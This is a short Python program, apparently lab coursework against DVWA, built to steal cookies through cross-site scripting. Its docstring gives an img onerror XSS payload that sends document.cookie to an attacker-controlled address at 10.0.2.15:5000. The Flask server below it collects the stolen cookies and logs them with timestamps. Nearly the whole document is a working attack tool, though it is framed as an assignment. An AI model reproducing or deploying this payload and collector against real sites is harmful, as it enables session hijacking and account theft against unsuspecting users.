"""
THIS PYTHON PROGRAM IS MADE TO DO COOKIE STEALING WITH XSS
--
DVWA -MEDIUM

COOKIE STEALING

---
Stealing cookie with Flask modules after injecting xss with an imgsrc
onerror using jscript
---

USE WITH KALI ATTACKER BOX AND META2

DO NOT ANYHOW USE THIS IS FOR ASSIGNMENT OR LEARNING PURPOSES

THIS IS THE JS XSS INJECTION

we can prompt an <alert> to test for cookies first
<img src=x onerror="alert(document.cookie)">

abusing imgsrc and send it to our kali vm ip:5000

<img src=x onerror="new Image().src='http://10.0.2.15:5000/steal?cookie='+document.cookie;">

Made BY: Kelvin Yap Ka Seng
"""


#import modules as required
from flask import Flask, request
from datetime import datetime


#call flask 
app = Flask(__name__)


#define our method
#set time and steal the cookie and write to a file
"""
with file open cookies.txt write using DDMMYY HHMMSS format and return the
cookies stolen
at the same time print the return cookie in terminal to make sure it return
"""
@app.route('/steal', methods=['GET'])
def steal_cookie():
    stolen_cookie = request.args.get('cookie')
    if stolen_cookie:
        timestamp = datetime.now().strftime("%d-%m-%Y %H:%M:%S")
        with open("cookies.txt", "a") as file:
            file.write(f"{timestamp} - {stolen_cookie}\n")
        return "Cookie received", 200
    return "No cookie received", 400

#if name == main
#start flask on port 5000 and listen to all hosts default: 0.0.0.0:5000
if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)



    
